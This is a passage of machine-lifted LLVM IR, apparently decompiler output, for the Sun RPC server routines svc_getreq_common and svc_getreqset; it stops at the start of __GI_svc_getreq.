define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-896 = alloca i32, align 4
  %stack_var_-1296 = alloca i32, align 4
  %v4_806314b = ptrtoint i32* %stack_var_-1296 to i32
  %v2_8063152 = ptrtoint i32* %stack_var_-896 to i32
  store i32 %v2_8063152, i32* %eax.global-to-local, align 4
  %v1_8063160 = call i32 @__rpc_thread_variables(i32 %v4_806314b)
  store i32 %v1_8063160, i32* %eax.global-to-local, align 4
  store i32 %v1_8063160, i32* %ebp.global-to-local, align 4
  %v1_8063167 = add i32 %v1_8063160, 180
  %v2_8063167 = inttoptr i32 %v1_8063167 to i32*
  %v3_8063167 = load i32, i32* %v2_8063167, align 4
  store i32 %v3_8063167, i32* @edx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v2_8063174 = mul i32 %arg1, 4
  %v3_8063174 = add i32 %v3_8063167, %v2_8063174
  %v4_8063174 = inttoptr i32 %v3_8063174 to i32*
  %v5_8063174 = load i32, i32* %v4_8063174, align 4
  store i32 %v5_8063174, i32* @ebx, align 4
  %v1_8063177 = icmp eq i32 %v5_8063174, 0
  br i1 %v1_8063177, label %entry.dec_label_pc_80632cf_crit_edge, label %dec_label_pc_806317f.preheader

entry.dec_label_pc_80632cf_crit_edge:             ; preds = %entry
  %v0_80632cf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80632cf

dec_label_pc_806317f.preheader:                   ; preds = %entry
  %v1_8063181 = add i32 %v5_8063174, 8
  %v2_8063181 = inttoptr i32 %v1_8063181 to i32*
  %v3_80631ec = bitcast i32* %stack_var_-896 to i16*
  %v1_806317f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806317f

dec_label_pc_806317f:                             ; preds = %dec_label_pc_806317f.preheader, %dec_label_pc_80632c8
  %v1_806317f = phi i32 [ %v1_806317f.pre, %dec_label_pc_806317f.preheader ], [ %v1_80632b2, %dec_label_pc_80632c8 ]
  %v0_806317f = phi i32 [ %arg1, %dec_label_pc_806317f.preheader ], [ 0, %dec_label_pc_80632c8 ]
  %v2_806317f = add i32 %v1_806317f, -4
  %v3_806317f = inttoptr i32 %v2_806317f to i32*
  store i32 %v0_806317f, i32* %v3_806317f, align 4
  %v0_8063180 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063180 = add i32 %v1_806317f, -8
  %v3_8063180 = inttoptr i32 %v2_8063180 to i32*
  store i32 %v0_8063180, i32* %v3_8063180, align 4
  %v3_8063181 = load i32, i32* %v2_8063181, align 4
  store i32 %v3_8063181, i32* %eax.global-to-local, align 4
  %v1_8063184 = add i32 %v1_806317f, 1212
  store i32 %v1_8063184, i32* @esi, align 4
  %v2_806318b = add i32 %v1_806317f, -12
  %v3_806318b = inttoptr i32 %v2_806318b to i32*
  store i32 %v1_8063184, i32* %v3_806318b, align 4
  %v2_806318c = add i32 %v1_806317f, -16
  %v3_806318c = inttoptr i32 %v2_806318c to i32*
  store i32 %v5_8063174, i32* %v3_806318c, align 4
  %v1_806318d = add i32 %v1_806317f, -20
  %v2_806318d = inttoptr i32 %v1_806318d to i32*
  store i32 134623631, i32* %v2_806318d, align 4
  %v4_806318d = inttoptr i32 %v3_8063181 to i32*
  %v5_806318d = load i32, i32* %v4_806318d, align 4
  call void @__pseudo_call(i32 %v5_806318d)
  %v0_806318f = load i32, i32* @esp, align 4
  %v1_8063192 = icmp eq i32 %v3_8063181, 0
  br i1 %v1_8063192, label %dec_label_pc_80632a8, label %dec_label_pc_806319a

dec_label_pc_806319a:                             ; preds = %dec_label_pc_806317f
  %v1_806319a = add i32 %v0_806318f, 828
  store i32 %v1_806319a, i32* %eax.global-to-local, align 4
  %v1_80631a1 = add i32 %v0_806318f, 1288
  store i32 %v1_80631a1, i32* %edx.global-to-local, align 4
  %v2_80631a8 = add i32 %v0_806318f, 1300
  %v3_80631a8 = inttoptr i32 %v2_80631a8 to i32*
  store i32 %v1_806319a, i32* %v3_80631a8, align 4
  %v0_80631af = load i32, i32* @esp, align 4
  %v1_80631af = add i32 %v0_80631af, 1224
  %v2_80631af = inttoptr i32 %v1_80631af to i32*
  %v3_80631af = load i32, i32* %v2_80631af, align 4
  store i32 %v3_80631af, i32* %eax.global-to-local, align 4
  %v2_80631b6 = add i32 %v0_80631af, 1260
  %v3_80631b6 = inttoptr i32 %v2_80631b6 to i32*
  store i32 %v3_80631af, i32* %v3_80631b6, align 4
  %v0_80631bd = load i32, i32* @esp, align 4
  %v1_80631bd = add i32 %v0_80631bd, 1228
  %v2_80631bd = inttoptr i32 %v1_80631bd to i32*
  %v3_80631bd = load i32, i32* %v2_80631bd, align 4
  store i32 %v3_80631bd, i32* %eax.global-to-local, align 4
  %v2_80631c4 = add i32 %v0_80631bd, 1264
  %v3_80631c4 = inttoptr i32 %v2_80631c4 to i32*
  store i32 %v3_80631bd, i32* %v3_80631c4, align 4
  %v0_80631cb = load i32, i32* @esp, align 4
  %v1_80631cb = add i32 %v0_80631cb, 1232
  %v2_80631cb = inttoptr i32 %v1_80631cb to i32*
  %v3_80631cb = load i32, i32* %v2_80631cb, align 4
  %v2_80631d2 = add i32 %v0_80631cb, 1268
  %v3_80631d2 = inttoptr i32 %v2_80631d2 to i32*
  store i32 %v3_80631cb, i32* %v3_80631d2, align 4
  %v0_80631d9 = load i32, i32* @esp, align 4
  %v1_80631d9 = add i32 %v0_80631d9, 1236
  store i32 %v1_80631d9, i32* %eax.global-to-local, align 4
  %v2_80631e0 = add i32 %v0_80631d9, 1288
  %v3_80631e0 = inttoptr i32 %v2_80631e0 to i32*
  store i32 %v5_8063174, i32* %v3_80631e0, align 4
  %v0_80631e7 = load i32, i32* @edi, align 4
  %v1_80631e7 = load i32, i32* @esp, align 4
  %v2_80631e7 = add i32 %v1_80631e7, -4
  %v3_80631e7 = inttoptr i32 %v2_80631e7 to i32*
  store i32 %v0_80631e7, i32* %v3_80631e7, align 4
  %v1_80631e8 = add i32 %v1_80631e7, -8
  %v2_80631e8 = inttoptr i32 %v1_80631e8 to i32*
  store i32 12, i32* %v2_80631e8, align 4
  %v0_80631ea = load i32, i32* %eax.global-to-local, align 4
  %v2_80631ea = add i32 %v1_80631e7, -12
  %v3_80631ea = inttoptr i32 %v2_80631ea to i32*
  store i32 %v0_80631ea, i32* %v3_80631ea, align 4
  %v0_80631eb = load i32, i32* %edx.global-to-local, align 4
  %v2_80631eb = add i32 %v1_80631e7, -16
  %v3_80631eb = inttoptr i32 %v2_80631eb to i32*
  store i32 %v0_80631eb, i32* %v3_80631eb, align 4
  %v4_80631ec = call i32 @memcpy(i16* %v3_80631ec, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80631ec, i32* %eax.global-to-local, align 4
  %v0_80631f1 = load i32, i32* @esp, align 4
  %v1_80631f4 = add i32 %v0_80631f1, 1252
  %v2_80631f4 = inttoptr i32 %v1_80631f4 to i32*
  %v3_80631f4 = load i32, i32* %v2_80631f4, align 4
  %v4_80631f4 = icmp eq i32 %v3_80631f4, 0
  %v1_80631fc = icmp eq i1 %v4_80631f4, false
  br i1 %v1_80631fc, label %dec_label_pc_806321d, label %dec_label_pc_80631fe

dec_label_pc_80631fe:                             ; preds = %dec_label_pc_806319a
  %v1_80631fe = add i32 %v0_80631f1, 1304
  %v2_80631fe = inttoptr i32 %v1_80631fe to i32*
  %v3_80631fe = load i32, i32* %v2_80631fe, align 4
  store i32 %v3_80631fe, i32* %edx.global-to-local, align 4
  %v0_8063205 = load i32, i32* @global_var_807ea20.795, align 32
  store i32 %v0_8063205, i32* %eax.global-to-local, align 4
  %v2_806320a = add i32 %v3_80631fe, 32
  %v3_806320a = inttoptr i32 %v2_806320a to i32*
  store i32 %v0_8063205, i32* %v3_806320a, align 4
  %v0_806320d = load i32, i32* @esp, align 4
  %v1_806320d = add i32 %v0_806320d, 1288
  %v2_806320d = inttoptr i32 %v1_806320d to i32*
  %v3_806320d = load i32, i32* %v2_806320d, align 4
  store i32 %v3_806320d, i32* %eax.global-to-local, align 4
  %v1_8063214 = add i32 %v3_806320d, 40
  %v2_8063214 = inttoptr i32 %v1_8063214 to i32*
  store i32 0, i32* %v2_8063214, align 4
  br label %dec_label_pc_806323f

dec_label_pc_806321d:                             ; preds = %dec_label_pc_806319a
  %v0_806321d = load i32, i32* @ecx, align 4
  %v2_806321d = add i32 %v0_80631f1, 12
  %v3_806321d = inttoptr i32 %v2_806321d to i32*
  store i32 %v0_806321d, i32* %v3_806321d, align 4
  %v0_806321e = load i32, i32* @ecx, align 4
  %v2_806321e = add i32 %v0_80631f1, 8
  %v3_806321e = inttoptr i32 %v2_806321e to i32*
  store i32 %v0_806321e, i32* %v3_806321e, align 4
  %v0_806321f = load i32, i32* @esi, align 4
  %v2_806321f = add i32 %v0_80631f1, 4
  %v3_806321f = inttoptr i32 %v2_806321f to i32*
  store i32 %v0_806321f, i32* %v3_806321f, align 4
  %v1_8063220 = add i32 %v0_80631f1, 1276
  store i32 %v1_8063220, i32* %eax.global-to-local, align 4
  %v3_8063227 = inttoptr i32 %v0_80631f1 to i32*
  store i32 %v1_8063220, i32* %v3_8063227, align 4
  %v0_8063228 = call i32 @_authenticate()
  store i32 %v0_8063228, i32* %eax.global-to-local, align 4
  %v0_806322d = load i32, i32* @esp, align 4
  %v1_8063230 = icmp eq i32 %v0_8063228, 0
  br i1 %v1_8063230, label %dec_label_pc_806323f, label %dec_label_pc_8063234

dec_label_pc_8063234:                             ; preds = %dec_label_pc_806321d
  %v0_8063234 = load i32, i32* @edx, align 4
  %v2_8063234 = add i32 %v0_806322d, 12
  %v3_8063234 = inttoptr i32 %v2_8063234 to i32*
  store i32 %v0_8063234, i32* %v3_8063234, align 4
  %v0_8063235 = load i32, i32* @edx, align 4
  %v2_8063235 = add i32 %v0_806322d, 8
  %v3_8063235 = inttoptr i32 %v2_8063235 to i32*
  store i32 %v0_8063235, i32* %v3_8063235, align 4
  %v0_8063236 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063236 = add i32 %v0_806322d, 4
  %v3_8063236 = inttoptr i32 %v2_8063236 to i32*
  store i32 %v0_8063236, i32* %v3_8063236, align 4
  %v3_8063237 = inttoptr i32 %v0_806322d to i32*
  store i32 %v5_8063174, i32* %v3_8063237, align 4
  %v2_8063238 = call i32 @svcerr_auth(i32 %v2_8063152, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8063238, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80632a5

dec_label_pc_806323f:                             ; preds = %dec_label_pc_806321d, %dec_label_pc_80631fe
  %v0_806323f = load i32, i32* %ebp.global-to-local, align 4
  %v1_806323f = add i32 %v0_806323f, 184
  %v2_806323f = inttoptr i32 %v1_806323f to i32*
  %v3_806323f = load i32, i32* %v2_806323f, align 4
  store i32 %v3_806323f, i32* @edx, align 4
  store i32 -1, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  store i32 0, i32* @ecx, align 4
  %v1_80632793 = icmp eq i32 %v3_806323f, 0
  %v1_806327b10 = icmp eq i1 %v1_80632793, false
  br i1 %v1_806327b10, label %dec_label_pc_806324e.lr.ph, label %dec_label_pc_806327d.thread

dec_label_pc_806327d.thread:                      ; preds = %dec_label_pc_806323f
  %v0_806329c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806329c

dec_label_pc_806324e.lr.ph:                       ; preds = %dec_label_pc_806323f
  %v1_8063251.pre = load i32, i32* @esp, align 4
  %v2_8063251 = add i32 %v1_8063251.pre, 1260
  %v3_8063251 = inttoptr i32 %v2_8063251 to i32*
  %v2_806325d = add i32 %v1_8063251.pre, 1264
  %v3_806325d = inttoptr i32 %v2_806325d to i32*
  br label %dec_label_pc_806324e

dec_label_pc_806324e:                             ; preds = %dec_label_pc_806324e.lr.ph, %dec_label_pc_8063277
  %v0_806327d23 = phi i32 [ 0, %dec_label_pc_806324e.lr.ph ], [ %v0_806327d22, %dec_label_pc_8063277 ]
  %v0_806328c = phi i32 [ 0, %dec_label_pc_806324e.lr.ph ], [ %v1_806327120, %dec_label_pc_8063277 ]
  %v0_8063266 = phi i32 [ -1, %dec_label_pc_806324e.lr.ph ], [ %v0_806326617, %dec_label_pc_8063277 ]
  %v0_8063277 = phi i32 [ %v3_806323f, %dec_label_pc_806324e.lr.ph ], [ %v2_8063277, %dec_label_pc_8063277 ]
  %v1_806324e = add i32 %v0_8063277, 4
  %v2_806324e = inttoptr i32 %v1_806324e to i32*
  %v3_806324e = load i32, i32* %v2_806324e, align 4
  store i32 %v3_806324e, i32* %eax.global-to-local, align 4
  %v4_8063251 = load i32, i32* %v3_8063251, align 4
  %v15_8063251 = icmp eq i32 %v3_806324e, %v4_8063251
  %v1_8063258 = icmp eq i1 %v15_8063251, false
  br i1 %v1_8063258, label %dec_label_pc_8063277, label %dec_label_pc_806325a

dec_label_pc_806325a:                             ; preds = %dec_label_pc_806324e
  %v1_806325a = add i32 %v0_8063277, 8
  %v2_806325a = inttoptr i32 %v1_806325a to i32*
  %v3_806325a = load i32, i32* %v2_806325a, align 4
  store i32 %v3_806325a, i32* %eax.global-to-local, align 4
  %v4_806325d = load i32, i32* %v3_806325d, align 4
  %v15_806325d = icmp eq i32 %v3_806325a, %v4_806325d
  br i1 %v15_806325d, label %dec_label_pc_806328c, label %dec_label_pc_8063266

dec_label_pc_8063266:                             ; preds = %dec_label_pc_806325a
  %tmp36 = icmp ugt i32 %v0_8063266, %v3_806325a
  br i1 %tmp36, label %dec_label_pc_806326a, label %dec_label_pc_806326c

dec_label_pc_806326a:                             ; preds = %dec_label_pc_8063266
  store i32 %v3_806325a, i32* @edi, align 4
  br label %dec_label_pc_806326c

dec_label_pc_806326c:                             ; preds = %dec_label_pc_8063266, %dec_label_pc_806326a
  %v0_806326618 = phi i32 [ %v0_8063266, %dec_label_pc_8063266 ], [ %v3_806325a, %dec_label_pc_806326a ]
  store i32 1, i32* @ecx, align 4
  %tmp37 = icmp ugt i32 %v3_806325a, %v0_806328c
  br i1 %tmp37, label %dec_label_pc_8063275, label %dec_label_pc_8063277

dec_label_pc_8063275:                             ; preds = %dec_label_pc_806326c
  store i32 %v3_806325a, i32* @esi, align 4
  br label %dec_label_pc_8063277

dec_label_pc_8063277:                             ; preds = %dec_label_pc_806326c, %dec_label_pc_806324e, %dec_label_pc_8063275
  %v0_8063281 = phi i32 [ %v3_806325a, %dec_label_pc_806326c ], [ %v3_806324e, %dec_label_pc_806324e ], [ %v3_806325a, %dec_label_pc_8063275 ]
  %v1_806327120 = phi i32 [ %v0_806328c, %dec_label_pc_806326c ], [ %v0_806328c, %dec_label_pc_806324e ], [ %v3_806325a, %dec_label_pc_8063275 ]
  %v0_806327d22 = phi i32 [ 1, %dec_label_pc_806326c ], [ %v0_806327d23, %dec_label_pc_806324e ], [ 1, %dec_label_pc_8063275 ]
  %v0_806326617 = phi i32 [ %v0_806326618, %dec_label_pc_806326c ], [ %v0_8063266, %dec_label_pc_806324e ], [ %v0_806326618, %dec_label_pc_8063275 ]
  %v1_8063277 = inttoptr i32 %v0_8063277 to i32*
  %v2_8063277 = load i32, i32* %v1_8063277, align 4
  store i32 %v2_8063277, i32* @edx, align 4
  %v1_8063279 = icmp eq i32 %v2_8063277, 0
  %v1_806327b = icmp eq i1 %v1_8063279, false
  br i1 %v1_806327b, label %dec_label_pc_806324e, label %dec_label_pc_806327d

dec_label_pc_806327d:                             ; preds = %dec_label_pc_8063277
  %v1_806327d = icmp eq i32 %v0_806327d22, 0
  br i1 %v1_806327d, label %dec_label_pc_806329c, label %dec_label_pc_8063281

dec_label_pc_8063281:                             ; preds = %dec_label_pc_806327d
  %v2_8063281 = add i32 %v1_8063251.pre, -4
  %v3_8063281 = inttoptr i32 %v2_8063281 to i32*
  store i32 %v0_8063281, i32* %v3_8063281, align 4
  %v0_8063282 = load i32, i32* @esi, align 4
  %v2_8063282 = add i32 %v1_8063251.pre, -8
  %v3_8063282 = inttoptr i32 %v2_8063282 to i32*
  store i32 %v0_8063282, i32* %v3_8063282, align 4
  %v0_8063283 = load i32, i32* @edi, align 4
  %v2_8063283 = add i32 %v1_8063251.pre, -12
  %v3_8063283 = inttoptr i32 %v2_8063283 to i32*
  store i32 %v0_8063283, i32* %v3_8063283, align 4
  %v2_8063284 = add i32 %v1_8063251.pre, -16
  %v3_8063284 = inttoptr i32 %v2_8063284 to i32*
  store i32 %v5_8063174, i32* %v3_8063284, align 4
  %v0_8063285 = call i32 @svcerr_progvers()
  store i32 %v0_8063285, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80632a5

dec_label_pc_806328c:                             ; preds = %dec_label_pc_806325a
  %v2_806328c = add i32 %v1_8063251.pre, -4
  %v3_806328c = inttoptr i32 %v2_806328c to i32*
  store i32 %v0_806328c, i32* %v3_806328c, align 4
  %v0_806328d = load i32, i32* @esi, align 4
  %v2_806328d = add i32 %v1_8063251.pre, -8
  %v3_806328d = inttoptr i32 %v2_806328d to i32*
  store i32 %v0_806328d, i32* %v3_806328d, align 4
  %v2_806328e = add i32 %v1_8063251.pre, -12
  %v3_806328e = inttoptr i32 %v2_806328e to i32*
  store i32 %v5_8063174, i32* %v3_806328e, align 4
  store i32 %v2_8063251, i32* %eax.global-to-local, align 4
  %v2_8063296 = add i32 %v1_8063251.pre, -16
  %v3_8063296 = inttoptr i32 %v2_8063296 to i32*
  store i32 %v2_8063251, i32* %v3_8063296, align 4
  %v1_8063297 = add i32 %v1_8063251.pre, -20
  %v2_8063297 = inttoptr i32 %v1_8063297 to i32*
  store i32 134623898, i32* %v2_8063297, align 4
  %v3_8063297 = load i32, i32* @edx, align 4
  %v4_8063297 = add i32 %v3_8063297, 12
  %v5_8063297 = inttoptr i32 %v4_8063297 to i32*
  %v6_8063297 = load i32, i32* %v5_8063297, align 4
  call void @__pseudo_call(i32 %v6_8063297)
  br label %dec_label_pc_80632a5

dec_label_pc_806329c:                             ; preds = %dec_label_pc_806327d.thread, %dec_label_pc_806327d
  %v0_806329c = phi i32 [ %v0_806329c.pre, %dec_label_pc_806327d.thread ], [ %v1_8063251.pre, %dec_label_pc_806327d ]
  %v2_806329f = add i32 %v0_806329c, -16
  %v3_806329f = inttoptr i32 %v2_806329f to i32*
  store i32 %v5_8063174, i32* %v3_806329f, align 4
  %v0_80632a0 = call i32 @__GI_svcerr_noprog()
  store i32 %v0_80632a0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80632a5

dec_label_pc_80632a5:                             ; preds = %dec_label_pc_806328c, %dec_label_pc_8063281, %dec_label_pc_8063234, %dec_label_pc_806329c
  %v0_80632a5 = load i32, i32* @esp, align 4
  br label %dec_label_pc_80632a8

dec_label_pc_80632a8:                             ; preds = %dec_label_pc_806317f, %dec_label_pc_80632a5
  %v0_80632a8.in = phi i32 [ %v0_806318f, %dec_label_pc_806317f ], [ %v0_80632a5, %dec_label_pc_80632a5 ]
  %v3_80632ab = load i32, i32* %v2_8063181, align 4
  store i32 %v3_80632ab, i32* %eax.global-to-local, align 4
  %v3_80632ae = inttoptr i32 %v0_80632a8.in to i32*
  store i32 %v5_8063174, i32* %v3_80632ae, align 4
  %v1_80632af = add i32 %v0_80632a8.in, -4
  %v2_80632af = inttoptr i32 %v1_80632af to i32*
  store i32 134623922, i32* %v2_80632af, align 4
  %v4_80632af = add i32 %v3_80632ab, 4
  %v5_80632af = inttoptr i32 %v4_80632af to i32*
  %v6_80632af = load i32, i32* %v5_80632af, align 4
  call void @__pseudo_call(i32 %v6_80632af)
  %v0_80632b2 = load i32, i32* @esp, align 4
  %v1_80632b2 = add i32 %v0_80632b2, 16
  %v1_80632b5 = icmp eq i32 %v3_80632ab, 0
  %v1_80632b7 = icmp eq i1 %v1_80632b5, false
  br i1 %v1_80632b7, label %dec_label_pc_80632c8, label %dec_label_pc_80632b9

dec_label_pc_80632b9:                             ; preds = %dec_label_pc_80632a8
  %v3_80632bc = load i32, i32* %v2_8063181, align 4
  store i32 %v3_80632bc, i32* %eax.global-to-local, align 4
  %v3_80632bf = inttoptr i32 %v0_80632b2 to i32*
  store i32 %v5_8063174, i32* %v3_80632bf, align 4
  %v1_80632c0 = add i32 %v0_80632b2, -4
  %v2_80632c0 = inttoptr i32 %v1_80632c0 to i32*
  store i32 134623939, i32* %v2_80632c0, align 4
  %v3_80632c0 = load i32, i32* %eax.global-to-local, align 4
  %v4_80632c0 = add i32 %v3_80632c0, 20
  %v5_80632c0 = inttoptr i32 %v4_80632c0 to i32*
  %v6_80632c0 = load i32, i32* %v5_80632c0, align 4
  call void @__pseudo_call(i32 %v6_80632c0)
  %v0_80632c3 = load i32, i32* @esp, align 4
  %v1_80632c3 = add i32 %v0_80632c3, 16
  %v0_80632d9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80632cf

dec_label_pc_80632c8:                             ; preds = %dec_label_pc_80632a8
  %v1_80632c8 = add i32 %v3_80632ab, -1
  %v8_80632c8 = icmp eq i32 %v1_80632c8, 0
  store i32 %v1_80632c8, i32* %eax.global-to-local, align 4
  br i1 %v8_80632c8, label %dec_label_pc_806317f, label %dec_label_pc_80632cf

dec_label_pc_80632cf:                             ; preds = %dec_label_pc_80632c8, %entry.dec_label_pc_80632cf_crit_edge, %dec_label_pc_80632b9
  %v0_80632d9 = phi i32 [ %arg1, %entry.dec_label_pc_80632cf_crit_edge ], [ %v0_80632d9.pre, %dec_label_pc_80632b9 ], [ %v1_80632c8, %dec_label_pc_80632c8 ]
  %v0_80632cf = phi i32 [ %v0_80632cf.pre, %entry.dec_label_pc_80632cf_crit_edge ], [ %v1_80632c3, %dec_label_pc_80632b9 ], [ %v1_80632b2, %dec_label_pc_80632c8 ]
  %v1_80632cf = add i32 %v0_80632cf, 1292
  %v6_80632cf = xor i32 %v0_80632cf, -2147483648
  %v7_80632cf = and i32 %v1_80632cf, %v6_80632cf
  %v8_80632cf = icmp slt i32 %v7_80632cf, 0
  store i1 %v8_80632cf, i1* @of, align 1
  %v1_80632d5 = inttoptr i32 %v1_80632cf to i32*
  %v2_80632d5 = load i32, i32* %v1_80632d5, align 4
  store i32 %v2_80632d5, i32* @ebx, align 4
  %v3_80632d5 = add i32 %v0_80632cf, 1296
  %v1_80632d6 = inttoptr i32 %v3_80632d5 to i32*
  %v2_80632d6 = load i32, i32* %v1_80632d6, align 4
  store i32 %v2_80632d6, i32* @esi, align 4
  %v3_80632d6 = add i32 %v0_80632cf, 1300
  %v1_80632d7 = inttoptr i32 %v3_80632d6 to i32*
  %v2_80632d7 = load i32, i32* %v1_80632d7, align 4
  store i32 %v2_80632d7, i32* @edi, align 4
  %v3_80632d7 = add i32 %v0_80632cf, 1304
  %v1_80632d8 = inttoptr i32 %v3_80632d7 to i32*
  %v2_80632d8 = load i32, i32* %v1_80632d8, align 4
  store i32 %v2_80632d8, i32* @ebp, align 4
  ret i32 %v0_80632d9

; uselistorder directives
  uselistorder i32 %v0_80632cf, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_80632c8, { 0, 2, 1 }
  uselistorder i32 %v3_80632ab, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8063277, { 1, 2, 0 }
  uselistorder i32 %v3_806325a, { 4, 0, 1, 3, 5, 7, 6, 8, 2, 9 }
  uselistorder i32 %v0_8063266, { 2, 1, 0 }
  uselistorder i32 %v0_806328c, { 0, 3, 2, 1 }
  uselistorder i32 %v2_8063251, { 1, 0, 2 }
  uselistorder i32 %v1_8063251.pre, { 0, 11, 10, 9, 8, 7, 4, 3, 2, 1, 6, 5 }
  uselistorder i32 %v0_806322d, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80631f1, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_806317f, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_8063174, { 4, 5, 0, 2, 7, 1, 3, 8, 6, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25 }
  uselistorder i32 -2147483648, { 12, 7, 11, 4, 8, 14, 0, 1, 2, 9, 10, 3, 5, 6, 13 }
  uselistorder i32 (i32, i32)* @svcerr_auth, { 1, 0 }
  uselistorder i32 1304, { 1, 0 }
  uselistorder i32 1300, { 1, 0 }
  uselistorder i32 1288, { 1, 2, 0 }
  uselistorder i32 -20, { 9, 8, 10, 11, 0, 3, 2, 1, 4, 12, 5, 13, 14, 15, 20, 21, 19, 18, 17, 16, 23, 22, 24, 25, 26, 27, 28, 29, 30, 6, 7, 31, 32, 33, 34 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80632cf, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80632a8, { 1, 0 }
  uselistorder label %dec_label_pc_80632a5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_806329c, { 1, 0 }
  uselistorder label %dec_label_pc_8063277, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806326c, { 1, 0 }
  uselistorder label %dec_label_pc_806324e, { 1, 0 }
  uselistorder label %dec_label_pc_806317f, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp8 = ptrtoint i32* %arg1 to i32
  %v0_80632dc = load i32, i32* @esi, align 4
  %v0_80632dd = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v2_80632e3 = call i32 @_rpc_dtablesize(i32 %v0_80632dd, i32 %v0_80632dc)
  store i32 %tmp8, i32* @edi, align 4
  %v0_806332a.pre = load i32, i32* @ebp, align 4
  %v5_806332e25 = icmp slt i32 %v0_806332a.pre, %v2_80632e3
  br i1 %v5_806332e25, label %dec_label_pc_80632f2.lr.ph, label %entry.dec_label_pc_8063330_crit_edge

entry.dec_label_pc_8063330_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8063330

dec_label_pc_80632f2.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80632f2

dec_label_pc_80632f2:                             ; preds = %dec_label_pc_80632f2.lr.ph, %dec_label_pc_8063324
  %v0_80632f226 = phi i32 [ %tmp8, %dec_label_pc_80632f2.lr.ph ], [ %v1_8063324, %dec_label_pc_8063324 ]
  %v1_80632f2 = inttoptr i32 %v0_80632f226 to i32*
  %v2_80632f2 = load i32, i32* %v1_80632f2, align 4
  br label %dec_label_pc_8063312

dec_label_pc_80632f6:                             ; preds = %dec_label_pc_8063312
  %v0_80632f9 = load i32, i32* @ebp, align 4
  %v2_80632f9 = add i32 %v2_8063316, -1
  %v3_80632f9 = add i32 %v2_80632f9, %v0_80632f9
  %v1_80632fe = call i32 @svc_getreq_common(i32 %v3_80632f9)
  %v0_8063303 = load i32, i32* @ebx, align 4
  %v1_8063303 = add i32 %v0_8063303, -1
  %v2_806330b = urem i32 %v1_8063303, 32
  %v4_806330b = icmp eq i32 %v2_806330b, 0
  br i1 %v4_806330b, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_80632f6
  %v5_806330b = shl i32 1, %v2_806330b
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_80632f6, %bb
  %v1_806330d = phi i32 [ 1, %dec_label_pc_80632f6 ], [ %v5_806330b, %bb ]
  %v0_806330d = load i32, i32* @esi, align 4
  %v2_806330d = xor i32 %v0_806330d, %v1_806330d
  br label %dec_label_pc_8063312

dec_label_pc_8063312:                             ; preds = %dec_label_pc_80632f2, %bb17
  %storemerge = phi i32 [ %v2_80632f2, %dec_label_pc_80632f2 ], [ %v2_806330d, %bb17 ]
  %v0_8063315 = phi i32 [ %v2_80632f2, %dec_label_pc_80632f2 ], [ %v2_806330d, %bb17 ]
  store i32 %storemerge, i32* @esi, align 4
  %v1_8063316 = trunc i32 %v0_8063315 to i16
  %v2_8063316 = call i32 @ffs(i16 %v1_8063316)
  store i32 %v2_8063316, i32* @ebx, align 4
  %v1_8063320 = icmp eq i32 %v2_8063316, 0
  %v1_8063322 = icmp eq i1 %v1_8063320, false
  br i1 %v1_8063322, label %dec_label_pc_80632f6, label %dec_label_pc_8063324

dec_label_pc_8063324:                             ; preds = %dec_label_pc_8063312
  %v0_8063324 = load i32, i32* @edi, align 4
  %v1_8063324 = add i32 %v0_8063324, 4
  store i32 %v1_8063324, i32* @edi, align 4
  %v0_8063327 = load i32, i32* @ebp, align 4
  %v1_8063327 = add i32 %v0_8063327, 32
  store i32 %v1_8063327, i32* @ebp, align 4
  %v5_806332e = icmp slt i32 %v1_8063327, %v2_80632e3
  br i1 %v5_806332e, label %dec_label_pc_80632f2, label %dec_label_pc_8063330

dec_label_pc_8063330:                             ; preds = %dec_label_pc_8063324, %entry.dec_label_pc_8063330_crit_edge
  %v0_8063337.lcssa = phi i32 [ %v2_80632e3, %entry.dec_label_pc_8063330_crit_edge ], [ %v2_8063316, %dec_label_pc_8063324 ]
  ret i32 %v0_8063337.lcssa

; uselistorder directives
  uselistorder i32 %v1_8063324, { 1, 0 }
  uselistorder i32 %v2_8063316, { 0, 3, 2, 1 }
  uselistorder i32 %v2_806330d, { 1, 0 }
  uselistorder i32 %v2_806330b, { 1, 0 }
  uselistorder i32 %v2_80632f2, { 1, 0 }
  uselistorder i32 %v2_80632e3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063312, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_80632f2, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i32, align 4
